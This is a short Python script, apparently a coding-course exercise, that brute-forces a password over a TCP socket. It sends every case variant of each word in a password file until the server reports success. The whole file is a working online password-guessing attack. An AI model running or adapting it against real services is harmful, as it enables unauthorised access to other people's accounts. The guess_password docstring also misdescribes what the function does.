"""Password Hacker with Python - Hack Module"""
import socket
from argparse import ArgumentParser, Namespace
from itertools import product
from typing import Any, Generator


def parse_arguments() -> Namespace:
    """Parse command line arguments"""

    parser = ArgumentParser()
    parser.add_argument("ip", type=str, help="IP Address")
    parser.add_argument("port", type=int, help="Port")
    args = parser.parse_args()
    return args


def case_combinations(word: str) -> Generator[str, Any, None]:
    """Generate all case combinations of a word"""
    # Build list of (lower, upper) tuples for each char
    variants = [(c.lower(), c.upper()) if c.isalpha() else (c,) for c in word]
    for combo in product(*variants):
        yield ''.join(combo)


def guess_password(max_length: int = 9) -> Generator[str, Any, None]:
    """Generate password guesses

    Try cartesian product of letters and digits up to max_length
    """

    with open("passwords.txt", "r") as file:
        passwords = file.read().splitlines()
        for password in passwords:
            for variant in case_combinations(password):
                yield variant


def main():
    args = parse_arguments()
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((args.ip, args.port))
    for guess in guess_password():
        client.send(guess.encode())
        response = client.recv(1024).decode()
        if response == "Connection success!":
            print(guess)
            client.close()
            return


if __name__ == "__main__":
    main()
